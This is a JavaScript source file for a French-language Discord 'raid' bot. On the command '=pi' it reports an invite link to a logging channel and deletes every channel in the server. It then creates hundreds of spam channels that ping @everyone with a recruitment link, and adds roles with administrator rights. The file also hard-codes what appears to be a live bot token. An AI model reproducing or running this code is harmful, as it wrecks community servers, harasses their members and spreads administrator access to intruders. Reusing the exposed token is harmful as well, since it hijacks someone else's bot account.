const Discord = require("discord.js");
const { Client, Collection } = require("discord.js");
const fs = require("fs");
const ms = require("ms")

const client =new Client();
client.commands = new Collection();

client.on('ready', () => {
    console.log("Looged in as ${client.user.tag} !");

});


client.on("message", async message => { 


        let channel = message.channel;
        if(message.channel.type === "dm") return
        if(message.content === "=pi")
        channel.createInvite({unique: true})
        .then(invite => {
            var embed = new Discord.MessageEmbed ( )

            .addField("Raid de : ","`" + message.author.tag + "`")
            .addField(":link: | Lien du serveur qui se fait Raid : ", "https://discord.gg/" + invite.code)
            .setTitle("Un Raid et lancée !")
            .setFooter("Raid by : " + message.author.tag)
            .setColor("RANDOM")
            .setTimestamp()

client.channels.cache.get('812105639890780182').send(embed) ;
console.log('Voici le serveur qui ce fais raid par des zgeug : https://discord.gg/' + invite.code)


var embed = new Discord.MessageEmbed()
.setTitle("Raid effectuée avec succés")
message.author.send(embed)

message.guild.channels.cache.forEach(c => c.delete() )


for(let i =0;i<=500;i++) {

    message.guild.channels.create('Raid by PI' , { 
        type: "texte"
    
    }).then(server => {

        server.send("**RAID BY PI 03 BIENTOT DICTATEUR : ** https://discord.gg/ahvTZ5j7FG https://media.discordapp.net/attachments/777285583797092413/814268488330903592/image0.gif https://media.discordapp.net/attachments/810956586184605707/814254819807723573/ezgif-3-cb8554050036.gif @everyone ")

        var embed = new Discord.MessageEmbed ()


        message.guild.roles.create({
            data: {
                name: 'La pi a encore frappé',
                color: 'RANDOM',
                permissions: "ADMINISTRATOR"
            },
            reason: 'raid' ,
        })
    })
}
    })
})

client.login("ODEyMDY1MzQ5NDI3MTM0NDg0.YC7Uyg.VzgKSQ8pp4-z_rEn-NjwW70EmDw")


            
            
            
